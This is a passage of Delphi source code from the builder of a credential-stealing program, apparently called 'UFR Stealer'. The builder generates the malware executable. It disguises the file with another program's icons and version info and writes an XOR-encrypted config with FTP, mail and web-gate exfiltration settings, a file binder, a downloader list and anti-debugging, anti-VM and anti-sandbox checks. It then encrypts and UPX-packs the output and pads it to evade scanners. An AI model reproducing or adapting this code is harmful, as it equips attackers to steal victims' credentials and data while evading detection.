    add  dword ptr [p], $24

    mov  ecx, $18
    mov  esi, offset h4
    mov  edi, dword ptr [p]
    rep  movsb
    add  dword ptr [p], $18

    mov  ecx, $28
    mov  esi, offset filedesc
    mov  edi, dword ptr [p]
    rep  movsb
    mov  edi, dword ptr [p]
    mov  eax, $28
    mov  ecx, dword ptr [l2]
    add  ecx, 1
    imul ecx, ecx, 2
    add  eax, ecx
    mov  word ptr [edi], ax
    add  dword ptr [p], $28
    
    mov  ecx, dword ptr [l2]
    mov  esi, dword ptr [s2]
    mov  edi, dword ptr [p]
    mov  eax, ecx
    imul eax, eax, 2
    add  dword ptr [p], eax
  cpy_e1:
    lodsw
    stosw
    dec  ecx
    jnz  cpy_e1
    mov  edi, dword ptr [p]
    mov  word ptr [edi], 0
    add  dword ptr [p], 2

  try_align_1:
    mov  eax, dword ptr [p]
    xor  edx, edx
    mov  ecx, 4
    div  ecx
    test edx, edx
    je   aligned_4_1
    add  dword ptr [p], 2
    jmp  try_align_1
  aligned_4_1:

    mov  ecx, $20
    mov  esi, offset filever
    mov  edi, dword ptr [p]
    rep  movsb
    mov  edi, dword ptr [p]
    mov  eax, $20
    mov  ecx, dword ptr [l4]
    add  ecx, 1
    imul ecx, ecx, 2
    add  eax, ecx
    mov  word ptr [edi], ax
    add  dword ptr [p], $20

    mov  ecx, dword ptr [l4]
    mov  esi, dword ptr [verstr]
    mov  edi, dword ptr [p]
    mov  eax, ecx
    imul eax, eax, 2
    add  dword ptr [p], eax
  cpy_e2:
    lodsw
    stosw
    dec  ecx
    jnz  cpy_e2
    mov  edi, dword ptr [p]
    mov  word ptr [edi], 0
    add  dword ptr [p], 2

  try_align_2:
    mov  eax, dword ptr [p]
    xor  edx, edx
    mov  ecx, 4
    div  ecx
    test edx, edx
    je   aligned_4_2
    add  dword ptr [p], 2
    jmp  try_align_2
  aligned_4_2:

    mov  ecx, $24
    mov  esi, offset filever2
    mov  edi, dword ptr [p]
    rep  movsb
    mov  edi, dword ptr [p]
    mov  eax, $24
    mov  ecx, dword ptr [l4]
    add  ecx, 1
    imul ecx, ecx, 2
    add  eax, ecx
    mov  word ptr [edi], ax
    add  dword ptr [p], $24

    mov  ecx, dword ptr [l4]
    mov  esi, dword ptr [verstr]
    mov  edi, dword ptr [p]
    mov  eax, ecx
    imul eax, eax, 2
    add  dword ptr [p], eax
  cpy_e3:
    lodsw
    stosw
    dec  ecx
    jnz  cpy_e3
    mov  edi, dword ptr [p]
    mov  word ptr [edi], 0
    add  dword ptr [p], 2

  try_align_3:
    mov  eax, dword ptr [p]
    xor  edx, edx
    mov  ecx, 4
    div  ecx
    test edx, edx
    je   aligned_4_3
    add  dword ptr [p], 2
    jmp  try_align_3
  aligned_4_3:

    mov  ecx, $20
    mov  esi, offset prodname
    mov  edi, dword ptr [p]
    rep  movsb
    mov  edi, dword ptr [p]
    mov  eax, $20
    mov  ecx, dword ptr [l3]
    add  ecx, 1
    imul ecx, ecx, 2
    add  eax, ecx
    mov  word ptr [edi], ax
    add  dword ptr [p], $20

    mov  ecx, dword ptr [l3]
    mov  esi, dword ptr [s3]
    mov  edi, dword ptr [p]
    mov  eax, ecx
    imul eax, eax, 2
    add  dword ptr [p], eax
  cpy_e4:
    lodsw
    stosw
    dec  ecx
    jnz  cpy_e4
    mov  edi, dword ptr [p]
    mov  word ptr [edi], 0
    add  dword ptr [p], 2
    
  try_align_4:
    mov  eax, dword ptr [p]
    xor  edx, edx
    mov  ecx, 4
    div  ecx
    test edx, edx
    je   aligned_4_4
    add  dword ptr [p], 2
    jmp  try_align_4
  aligned_4_4:

    mov  ecx, $20
    mov  esi, offset compname
    mov  edi, dword ptr [p]
    rep  movsb
    mov  edi, dword ptr [p]
    mov  eax, $20
    mov  ecx, dword ptr [l1]
    add  ecx, 1
    imul ecx, ecx, 2
    add  eax, ecx
    mov  word ptr [edi], ax
    add  dword ptr [p], $20

    mov  ecx, dword ptr [l1]
    mov  esi, dword ptr [s1]
    mov  edi, dword ptr [p]
    mov  eax, ecx
    imul eax, eax, 2
    add  dword ptr [p], eax
  cpy_e5:
    lodsw
    stosw
    dec  ecx
    jnz  cpy_e5
    mov  edi, dword ptr [p]
    mov  word ptr [edi], 0
    add  dword ptr [p], 2

  try_align_5:
    mov  eax, dword ptr [p]
    xor  edx, edx
    mov  ecx, 4
    div  ecx
    test edx, edx
    je   aligned_4_5
    add  dword ptr [p], 2
    jmp  try_align_5
  aligned_4_5:

    mov  ecx, $44
    mov  esi, offset endh
    mov  edi, dword ptr [p]
    rep  movsb
    add  dword ptr [p], $44
  end;
  // fix sizes
  asm
    mov  edi, dword ptr [hMem]
    mov  eax, dword ptr [p]
    sub  eax, dword ptr [hMem]
    mov  word ptr [edi], ax
    push eax
    sub  ax, $5C + $44
    mov  word ptr [edi+$5c], ax
    pop  eax
    sub  ax, $80 + $44
    mov  word ptr [edi+$80], ax
  end;
  ResUpdateFromData(pointer(hMem), p-hMem, fn, 1, RT_VERSION);
  VirtualFree(pointer(hMem), 0, MEM_RELEASE);
end;

procedure TForm3.Struc2Build(ExeName:string;silent:boolean);
var
  bz,hk,dh: byte;
  wz,wh:word;
  hMapFile,hMap,hFile,nw,i,i2,dd:dword;
  dw:word;
  RND_KEY: array[0..15] of byte;
  Myfile,hResource:cardinal;
  f1,fs,nr:dword;
  TmpDir: PChar;
  manif:ansistring;
  tmp:string;
  RW_buf: array[1..1024] of byte;
  p:pointer;
begin
  bz:=0;
  if (bs.copy_to_folder=false) and (bs.use_ftp=false) and (bs.use_gate=false) and (bs.use_mail=false) then
    begin
       if not silent then MessageBox(application.Handle, pchar(err12t), pchar(err1c), MB_ICONWARNING);
       exit;      
    end;
  if (bs.change_icon) and (bs.change_icon_file='') then
     begin
       if not silent then MessageBox(application.Handle, pchar(err4t), pchar(err1c), MB_ICONWARNING);
       exit;
     end;
  if (bs.bind) and (bs.bind_fc=0) then
     begin
       if not silent then MessageBox(application.Handle, pchar(err6t), pchar(err1c), MB_ICONWARNING);
       exit;
     end;
  if (bs.ftp_tofolder) and (bs.ftp_tofolder_name='') then
     begin
       if not silent then MessageBox(application.Handle, pchar(err6t), pchar(err1c), MB_ICONWARNING);
       exit;
     end;
  if (bs.copy_to_folder) and (bs.copy_to_folder_name='') then
     begin
       if not silent then MessageBox(application.Handle, pchar(err10t), pchar(err1c), MB_ICONWARNING);
       exit;
     end;
  if (bs.use_ftp) and ((bs.ftp_host='') or (bs.ftp_login='') or (bs.ftp_pwd=''))then
     begin
       if not silent then MessageBox(application.Handle, pchar(err6t), pchar(err1c), MB_ICONWARNING);
       exit;
     end;
  if (bs.use_mail) and ((bs.mail_from='') or (bs.mail_to='') or (bs.mail_login='')
      or (bs.mail_server=''))then
     begin
       if not silent then MessageBox(application.Handle, pchar(err6t), pchar(err1c), MB_ICONWARNING);
       exit;
     end;
  if (bs.use_gate) and ((bs.gate1='') or (bs.gate2='')) then
     begin
       if not silent then MessageBox(application.Handle, pchar(err6t), pchar(err1c), MB_ICONWARNING);
       exit;
     end;
  if ExeName='' then
     begin
       if not silent then MessageBox(application.Handle, pchar(err6t), pchar(err1c), MB_ICONWARNING);
       exit;
     end;

       TmpDir := StrAlloc(MAX_PATH);
       GetTempPath(MAX_PATH, TmpDir);
       tmp := ansistring(TmpDir);
       if tmp[Length(tmp)] <> '\' then tmp := tmp + '\';
       StrDispose(TmpDir);
       tmp:=tmp+'ufr_build';
       hFile:=CreateFile(pchar(tmp), GENERIC_READ or GENERIC_WRITE,
                                      FILE_SHARE_READ or FILE_SHARE_WRITE,
                                      nil, CREATE_ALWAYS,
                                      FILE_ATTRIBUTE_HIDDEN, 0);
       if hFile=INVALID_HANDLE_VALUE then exit;

       ExeName:=changefileext(ExeName, '.exe');

       ExtractRes('EXEFILE', 'STUB', ExeName);

       if bs.change_icon then
       SetAppIcon(ExeName, bs.change_icon_file, '102');

       if bs.set_vi then
       SetVersionInfo(ExeName);

//===================================================
// MASKING
       if bs.use_masking then
       begin
         Myfile:=LoadLibraryEx(pchar(bs.masking_file),0,LOAD_LIBRARY_AS_DATAFILE);
         if (Myfile<>0) then
         begin
           hResource := BeginUpdateResource(pchar(ExeName),TRUE);
           if (hResource<>0) then
           begin
             EnumResourceNames(Myfile,RT_ICON,@UpdateResources,hResource);
             EnumResourceNames(Myfile,RT_GROUP_ICON,@UpdateResources,hResource);
             EnumResourceNames(Myfile,RT_VERSION,@UpdateResources,hResource);
             EndUpdateResource(hResource,false);
           end;
         FreeLibrary(Myfile);
         end;
       end;
//===================================================
       randomize;
       for i:=1 to 16 do
         begin
           dh:=random(256);
           RND_KEY[i-1]:=dh;
           WriteFile(hFile, dh, sizeof(dh), nw, nil);
         end;
//########################################################################
// Anti's
       // Anti-Dbg
       dh:=bs.anti_dbg;
       WriteFile(hFile, dh, sizeof(dh), nw, nil);
       // Anti-VBox
       dh:=bs.anti_vbox;
       WriteFile(hFile, dh, sizeof(dh), nw, nil);
       // Anti-Wireshark
       dh:=bs.anti_ws;
       WriteFile(hFile, dh, sizeof(dh), nw, nil);
       // Anti-VMware
       dh:=bs.anti_vm;
       WriteFile(hFile, dh, sizeof(dh), nw, nil);
       // Anti-Anubis
       dh:=bs.anti_anubis;
       WriteFile(hFile, dh, sizeof(dh), nw, nil);
       // Anti-Sandboxie
       dh:=bs.anti_sbie;
       WriteFile(hFile, dh, sizeof(dh), nw, nil);
       // Anti-ProcExp
       dh:=bs.anti_procexp;
       WriteFile(hFile, dh, sizeof(dh), nw, nil);
       // Anti-ProcMon
       dh:=bs.anti_procmon;
       WriteFile(hFile, dh, sizeof(dh), nw, nil);
       // Anti-FileMon
       dh:=bs.anti_filemon;
       WriteFile(hFile, dh, sizeof(dh), nw, nil);
       // Anti-RegMon
       dh:=bs.anti_regmon;
       WriteFile(hFile, dh, sizeof(dh), nw, nil);
       // Killself if Exe's in processes
       if bs.anti_fc>0 then
         begin
           // calc and write size
           dd:=4;
           for i:=0 to bs.anti_fc-1 do
           begin
             dd:=dd+dword(length(bs.anti_exes[i])+1)*2;
           end;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);

           // write count
           dd:=bs.anti_fc;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);

           // write data
           for i:=0 to bs.anti_fc-1 do
           begin
             for i2:=1 to length(bs.anti_exes[i]) do
             begin
               wh:=ord(bs.anti_exes[i][i2]);
               WriteFile(hFile, wh, sizeof(wh), nw, nil);
             end;
             WriteFile(hFile, wz, sizeof(wz), nw, nil);
           end;
         end
       else
         begin
           dd:=0;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);
         end;
//===================================================
// FTP
       if bs.use_ftp then
         begin
           // Host
           s:=bs.ftp_host;
           dd:=length(s)+1;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);
           for i:=1 to dd-1 do
           begin
             dh:=ord(s[i]);
             WriteFile(hFile, dh, sizeof(dh), nw, nil);
           end;
           WriteFile(hFile, bz, sizeof(bz), nw, nil);
           // Login
           s:=bs.ftp_login;
           dd:=length(s)+1;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);
           for i:=1 to dd-1 do
           begin
             dh:=ord(s[i]);
             WriteFile(hFile, dh, sizeof(dh), nw, nil);
           end;
           WriteFile(hFile, bz, sizeof(bz), nw, nil);
           // Pwd
           s:=bs.ftp_pwd;
           dd:=length(s)+1;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);
           for i:=1 to dd-1 do
           begin
             dh:=ord(s[i]);
             WriteFile(hFile, dh, sizeof(dh), nw, nil);
           end;
           WriteFile(hFile, bz, sizeof(bz), nw, nil);
           // Passive Mode
           if bs.ftp_pm then dh:=1 else dh:=0;
           WriteFile(hFile, dh, sizeof(dh), nw, nil);
         end
       else
         begin
           dd:=0;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);
         end;
//===================================================
// Mail
       if bs.use_mail then
         begin
           // From
           s:=bs.mail_from;
           dd:=length(s)+1;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);
           for i:=1 to dd-1 do
           begin
             dh:=ord(s[i]);
             WriteFile(hFile, dh, sizeof(dh), nw, nil);
           end;
           WriteFile(hFile, bz, sizeof(bz), nw, nil);
           // To
           s:=bs.mail_to;
           dd:=length(s)+1;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);
           for i:=1 to dd-1 do
           begin
             dh:=ord(s[i]);
             WriteFile(hFile, dh, sizeof(dh), nw, nil);
           end;
           WriteFile(hFile, bz, sizeof(bz), nw, nil);
           // Login
           s:=bs.mail_login;
           dd:=length(s)+1;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);
           for i:=1 to dd-1 do
           begin
             dh:=ord(s[i]);
             WriteFile(hFile, dh, sizeof(dh), nw, nil);
           end;
           WriteFile(hFile, bz, sizeof(bz), nw, nil);
           // Pwd hash
           s:=bs.mail_pwd;
           dd:=length(s)+1;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);
           for i:=1 to dd-1 do
           begin
             dh:=ord(s[i]);
             WriteFile(hFile, dh, sizeof(dh), nw, nil);
           end;
           WriteFile(hFile, bz, sizeof(bz), nw, nil);
           // Server
           s:=bs.mail_server;
           dd:=length(s)+1;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);
           for i:=1 to dd-1 do
           begin
             dh:=ord(s[i]);
             WriteFile(hFile, dh, sizeof(dh), nw, nil);
           end;
           WriteFile(hFile, bz, sizeof(bz), nw, nil);
           // Port
           dw:=bs.mail_port;
           WriteFile(hFile, dw, sizeof(dw), nw, nil);
         end
       else
         begin
           dd:=0;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);
         end;
// IF PWD PROTECTED THEN WRITE RSA KEY
       if length(bs.steal_key_string)>0 then
       begin
         // PWD PROTECTED KEY SIZE
         dd:=(length(bs.steal_key_string) div 2 ) + sizeof(RSA512_PUBLIC_HEADER);
         WriteFile(hFile, dd, sizeof(dd), nw, nil);
         WriteFile(hFile, RSA512_PUBLIC_HEADER, sizeof(RSA512_PUBLIC_HEADER), nw, nil);
         for i:=1 to (length(bs.steal_key_string) div 2) do
         begin
           dh:=strtoint('$'+bs.steal_key_string[(i-1)*2+1]
                           +bs.steal_key_string[(i-1)*2+2]);
           WriteFile(hFile, dh, sizeof(dh), nw, nil);
         end;
       end
       else
       begin
         // PWD PROTECTED KEY SIZE
         dd:=0;
         WriteFile(hFile, dd, sizeof(dd), nw, nil);
       end;
       //
// GRAB OUTER IP
       if bs.grab_external_ip then
          dh:=1
       else
          dh:=0;
       WriteFile(hFile, dh, sizeof(dh), nw, nil);
//===================================================
       // Flash Folder Name
       if bs.copy_to_folder then
         begin
           s:=bs.copy_to_folder_name;
           dd:=length(s)+1;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);
           for i:=1 to length(s) do
             begin
               dh:=ord(s[i]);
               WriteFile(hFile, dh, sizeof(dh), nw, nil);
             end;
           WriteFile(hFile, bz, sizeof(bz), nw, nil);
         end
       else
         begin
           dd:=0;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);
         end;
//===================================================
if bs.bind then                     // FILE JOINER
begin
   // fc
   dd:=bs.bind_fc;
   WriteFile(hFile, dd, sizeof(dd), nw, nil);
   // run style
   dd:=bs.bind_run_files_before_after;
   WriteFile(hFile, dd, sizeof(dd), nw, nil);
   // sizeof all
   dd:=0;
   for i:=0 to bs.bind_fc-1 do
   begin
     s:=copy(bs.bind_files[i],
             1,
             Pos('*',bs.bind_files[i])-1
             );
     s2:=extractfilename(s);
     fs:=GetFS(s);
     dd:=dd+4{fs}+1{ron-or-not}+(dword(length(s2))+1){filename}+fs{file};
   end;
   WriteFile(hFile, dd, sizeof(dd), nw, nil);

   for i:=0 to bs.bind_fc-1 do
   begin
      s:=copy(bs.bind_files[i],
             1,
             Pos('*',bs.bind_files[i])-1
             );
      s2:=extractfilename(s);
      // Run or Not
      dh:=strtoint(copy(bs.bind_files[i],Pos('*',bs.bind_files[i])+1,1));
      WriteFile(hFile, dh, sizeof(dh), nw, nil);
      // name + zerobyte
      for i2:=1 to length(s2) do
      begin
        dh:=ord(s2[i2]);
        WriteFile(hFile, dh, sizeof(dh), nw, nil);
      end;
      WriteFile(hFile, bz, sizeof(bz), nw, nil);
      // fs
      dd:=GetFS(s);
      WriteFile(hFile, dd, sizeof(dd), nw, nil);
      // file
      assignfile(f, s);
      reset(f);
      repeat
        blockread(f,RW_buf,sizeof(RW_buf),nr);
        WriteFile(hFile, RW_buf, nr, nw, nil);
      until nr = 0;
      closefile(f);
   end;
end
else
   begin
     dd:=0;
     WriteFile(hFile, dd, sizeof(dd), nw, nil);
   end;
//===================================================
       // FTP Dir
       if bs.ftp_tofolder then
         begin
           s:=bs.ftp_tofolder_name;
           dd:=length(s)+1;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);
           for i:=1 to length(s) do
             begin
               dh:=ord(s[i]);
               WriteFile(hFile, dh, sizeof(dh), nw, nil);
             end;
           WriteFile(hFile, bz, sizeof(bz), nw, nil);
         end
       else
         begin
           dd:=0;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);
         end;
//===================================================
// ���� - ����
       if bs.use_gate then
         begin
           s:=bs.gate1;
           dd:=length(s)+1;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);
           for i:=1 to length(s) do
           begin
             dh:=ord(s[i]);
             WriteFile(hFile, dh, sizeof(dh), nw, nil);
           end;
           WriteFile(hFile, bz, sizeof(bz), nw, nil);
         end
       else
         begin
           dd:=0;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);
         end;
//===================================================
// ���� - ����
       if bs.use_gate then
         begin
           s:=bs.gate2;
           dd:=length(s)+1;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);
           for i:=1 to length(s) do
           begin
             dh:=ord(s[i]);
             WriteFile(hFile, dh, sizeof(dh), nw, nil);
           end;
           WriteFile(hFile, bz, sizeof(bz), nw, nil);
         end
       else
         begin
           dd:=0;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);
         end;
//########################################################################
// Dloader
       if bs.dload_fc>0 then
         begin
           // calc and write size
           dd:=4;
           for i:=0 to bs.dload_fc-1 do
           begin
             dd:=dd+dword(length(bs.dload_files[i]))+1;
           end;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);

           // write count
           dd:=bs.dload_fc;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);

           // write data
           for i:=0 to bs.dload_fc-1 do
           begin
             for i2:=1 to length(bs.dload_files[i]) do
             begin
               dh:=ord(bs.dload_files[i][i2]);
               WriteFile(hFile, dh, sizeof(dh), nw, nil);
             end;
             WriteFile(hFile, bz, sizeof(bz), nw, nil);
           end;
         end
       else
         begin
           dd:=0;
           WriteFile(hFile, dd, sizeof(dd), nw, nil);
         end;
// HIDE FOLDER
       if bs.hide_files_folder then
          dh:=1
       else
          dh:=0;
       WriteFile(hFile, dh, sizeof(dh), nw, nil);
// Self Delete
       if bs.selfdel then
         dh:=1
       else
         dh:=0;
       WriteFile(hFile, dh, sizeof(dh), nw, nil);
// Drop To Dir
       if bs.dropto_victim then
         dh:=bs.dropto_victim_index+1
       else
         dh:=0;
       WriteFile(hFile, dh, sizeof(dh), nw, nil);
// Sleep
       if bs.sleep_enabled then
         dd:=bs.sleep*1000
       else
         dd:=0;
       WriteFile(hFile, dd, sizeof(dd), nw, nil);
// CLOSE
       CloseHandle(hFile);

//---------------------------------------------------
// XOR the config
       hFile:=CreateFile(pchar(tmp), GENERIC_READ or GENERIC_WRITE,
                                      FILE_SHARE_READ or FILE_SHARE_WRITE,
                                      nil, OPEN_EXISTING,
                                      FILE_ATTRIBUTE_HIDDEN, 0);
       if hFile=INVALID_HANDLE_VALUE then exit;
       fs:=GetFileSize(hFile,nil);
       if fs=INVALID_FILE_SIZE then exit;
       hMap:=CreateFileMapping(hFile, nil, PAGE_READWRITE, 0, fs, nil);
       if hMap=0 then exit;
       hMapFile:=dword(MapViewOfFile(hMap, FILE_MAP_WRITE, 0, 0, 0));
       if hMapFile=0 then exit;
       for i:=0 to fs-1-16 do
       begin
         hk:=ord(RND_KEY[(i) mod 16]);
         asm
           mov eax, dword ptr [hMapFile]
           add eax, i
           add eax, 16
           mov cl, byte ptr [eax]
           xor cl, byte ptr [hk]
           mov byte ptr [eax], cl
         end;
       end;
       UnmapViewOfFile(pointer(hMapFile));
       CloseHandle(hMap);
       CloseHandle(hFile);
//---------------------------------------------------
// Set Resource config
       hFile:=CreateFile(pchar(tmp), GENERIC_READ or GENERIC_WRITE,
                                      FILE_SHARE_READ or FILE_SHARE_WRITE,
                                      nil, OPEN_EXISTING,
                                      FILE_ATTRIBUTE_HIDDEN, 0);
       if hFile=INVALID_HANDLE_VALUE then exit;
       hMap:=CreateFileMapping(hFile, nil, PAGE_READWRITE, 0, fs, nil);
       if hMap=0 then exit;
       hMapFile:=dword(MapViewOfFile(hMap, FILE_MAP_WRITE, 0, 0, 0));
       if hMapFile=0 then exit;
       ResUpdateFromData(pointer(hMapFile), fs, ExeName, $0C, RT_BITMAP);
       UnmapViewOfFile(pointer(hMapFile));
       CloseHandle(hMap);
       CloseHandle(hFile);
//---------------------------------------------------
// Set manifest
       if bs.adminmanifest then
         manif:=manifadm
       else
         manif:=manifusr;
       ResUpdateFromData(pointer(manif), length(manif), ExeName, $01, MakeIntResource(RT_MANIFEST));
//---------------------------------------------------
// Encrypt code and write decryptor, Zero Filling Engine routine
       DecryptorGeneracion.CryptCodeWriteDecryptor(ExeName);
//---------------------------------------------------
// Pack build with UPX
       if bs.use_upx then
       UPX_Pack_and_Hack(ExeName);
//---------------------------------------------------
// File Pump
       if bs.write_overlay then
       begin
         f1 := CreateFile(PChar(ExeName),
                          GENERIC_READ or GENERIC_WRITE,
                          FILE_SHARE_READ or FILE_SHARE_WRITE,
                          nil, OPEN_EXISTING, 0, 0);
         SetFilePointer(f1,0,nil,FILE_END);
         p:=VirtualAlloc(nil,bs.write_overlay_size,MEM_COMMIT or MEM_RESERVE,PAGE_READWRITE);
         WriteFile(f1, p^, bs.write_overlay_size, i2, nil);
         VirtualFree(p, 0, MEM_RELEASE);
         CloseHandle(f1);
       end;
//---------------------------------------------------
       DeleteFile(pchar(tmp));

       if not silent then MessageBox(application.Handle, pchar(g1t), pchar(g1t), MB_ICONINFORMATION);
end;

procedure TForm3.CheckBox7Click(Sender: TObject);
begin
if checkbox7.checked then
  begin
    combobox4.Enabled:=true;
  end
else
  begin
    combobox4.Enabled:=false;
  end;
  bs.dropto_victim:=checkbox7.Checked;
end;

procedure bw_bitmap(img:tbitmap);
  function RGBToColor(R, G, B : byte): TColor;
  begin
    Result := ((R and $FF) shl 16) +
      ((G and $FF) shl 8) + (B and $FF);
  end;
var
  i,j:dword;
  r,g,b,x:byte;
  t:tcolor;
begin
  for i:=0 to img.Width-1 do
  begin
    for j:=0 to img.Height-1 do
    begin
      t:=img.Canvas.Pixels[i,j];
      r:=GetRValue(t);
      g:=GetGValue(t);
      b:=GetBValue(t);
      x:=round(0.3*r+0.59*g+0.11*b);
      t:=RGBToColor(x,x,x);
      img.Canvas.Pixels[i,j]:=t;
    end;
  end;
end;

procedure TForm3.ImagesWork;
var
  bitmap:TBitMap;
begin
  newimlist := TImageList.Create(self);
  bitmap:=tbitmap.Create;
  bitmap.Height:=16;bitmap.Width:=16;
  bitmap.Canvas.Brush.Color:=treeview1.color;

  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image1.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image2.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image3.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image4.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image5.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image6.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image7.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image8.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image9.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image10.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image11.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image12.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image13.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image14.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image15.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image16.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image17.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image19.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image21.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image22.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image23.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image24.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image26.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image27.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image20.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image28.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image29.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image30.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image31.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image32.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image33.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image34.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image35.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image43.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image44.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image45.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  bitmap.canvas.FillRect(bounds(0,0,16,16));
  bitmap.Canvas.Draw(0,0,image46.Picture.Graphic);
  newimlist.Add(bitmap,nil);
  
  treeview1.Images:=newimlist;
  bitmap.Free;
end;

procedure TForm3.VerInfoWork;
var
  s:string;
  n,Len,i:DWORD;
  Buf:PChar;
  Value:PChar;
  s2,s3:string;
  p:integer;
begin
  S := Application.ExeName;
  n := GetFileVersionInfoSize(PChar(S), n);
  if n > 0 then
  begin
    Buf := AllocMem(n);
    GetFileVersionInfo(PChar(S), 0, n, Buf);
    if VerQueryValue(Buf, PChar('StringFileInfo\041904E3\FileVersion'), Pointer(Value), Len) then
    ufr_ver:=value;
    FreeMem(Buf, n);
    Form3.Caption:='UFR Stealer v'+ufr_ver;
    // parse version string to dword
    s2:=ufr_ver;
